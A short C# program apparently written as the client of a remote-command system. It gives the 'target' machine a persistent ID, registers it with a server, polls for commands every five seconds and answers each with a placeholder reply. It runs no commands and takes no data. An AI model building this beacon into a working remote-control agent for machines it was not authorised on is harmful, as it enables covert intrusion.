using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading;
using sharedFunctions;

namespace targetClient
{
    class TgClient
    {
        private static ServerController serverController;

        private static Target target;

        private static System.Windows.Forms.Timer timer;

        private static Queue<Command> cmdQueue;

        private static AutoResetEvent newData;

        static void Main(string[] args)
        {
            newData = new AutoResetEvent(false);

            cmdQueue = new Queue<Command>();

            timer = new System.Windows.Forms.Timer();

            timer.Interval = 5000;
            timer.Tick += timer_Tick;

            int uid = IdManager.loadUID();
            if (uid == -1)
            {
                uid = IdManager.createUID();
                IdManager.saveUID(uid);
            }

            Debug.WriteLine("id: " + uid.ToString());

            target = new Target(uid, DateTime.Now);

            serverController = new ServerController(target);

            serverController.register();

            timer.Start();

            Debug.WriteLine("blub");

            Thread mainThread = new Thread(new ThreadStart(cmdInterpreter));
            mainThread.Start();

            Application.Run();

        }
        
        
        static void cmdInterpreter()
        {
            while (true)
            {
                newData.WaitOne();
                while (cmdQueue.Count > 0)
                {
                    Command command = cmdQueue.Dequeue();
                    Debug.WriteLine("new data appeared");
                    Debug.WriteLine(command.ToString());
                    serverController.saveResponse(new Response(command.ID, "yaay i got a command"));
                }	
            }
        }

        static void timer_Tick(object sender, EventArgs e)
        {
            Command[] commands = serverController.listCommands();
            foreach (Command command in commands)
            {
                cmdQueue.Enqueue(serverController.getCommand(command.ID));
                Debug.WriteLine("enqueued command no " + command.ID.ToString());
            }
            if (cmdQueue.Count > 0) newData.Set();
            Debug.WriteLine("tick");
        }

    }
}
